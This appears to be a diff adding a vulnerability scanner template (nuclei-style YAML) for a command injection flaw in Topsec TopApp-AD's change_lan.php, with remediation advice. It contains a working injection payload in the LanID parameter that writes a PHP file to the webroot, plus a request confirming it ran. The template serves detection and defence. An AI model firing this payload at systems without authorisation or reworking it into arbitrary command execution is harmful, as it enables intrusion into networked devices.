@@ -1,0 +1,35 @@
+id: TopApp-AD_change_lan_php-RCE
+info:
+  name: Topsec TopApp-AD change_lan.php LanID parameter command execution
+  author:
+  - l0ne1y
+  description: |-
+    Topsec TopApp-AD change_lan.php command execution vulnerability
+    Topsec TopApp-AD application delivery system is the application delivery device with the most complete functionality in the industry.
+
+    Topsec TopApp-AD has a command execution vulnerability. Attackers can exploit it to execute arbitrary system commands.
+  severity: critical
+  remediation: |-
+    Official remedy:
+    1. It is recommended that users obtain the latest patch or the latest version program from the official website:
+    https://www.topsec.com.cn/
+
+    Temporary remedy:
+    1. Try not to execute external applications or commands.
+    2. Use custom functions or function libraries to implement the functionality of external applications or commands.
+    3. Before executing functions with command execution functionality such as system and eval, validate the parameter content.
+    4. Use the escapeshellarg function to process related parameters. The escapeshellarg function escapes any character that could end a parameter or a command; for example, single quotes are escaped, double quotes are escaped, and semicolons are escaped. This confines the parameter content within a pair of single or double quotes, escaping the single or double quotes contained in the parameter so they cannot truncate the current execution, thereby preventing command injection attacks.
+    5. Use safe_mode_exec_dir to specify the executable file path. Set safe_mode in the php.ini file to On, place the allowed executable files into a directory, and use safe_mode_exec_dir to specify this executable path. When an external program needs to be executed, it will only be allowed to run if it resides in the directory specified by safe_mode_exec_dir; otherwise execution will fail.
+requests:
+- path:
+  - '{{BaseURL}}/change_lan.php'
+  method: POST
+  body: LanID=1' | echo <?php echo md5(1);unlink(__FILE__);?> > {{randstr}}.php |
+    '
+- matchers:
+  - type: dsl
+    dsl:
+    - status_code==200 && contains(body,"c4ca4238a0b923820dcc509a6f75849b")
+  path:
+  - '{{BaseURL}}/{{randstr}}.php'
+  method: GET
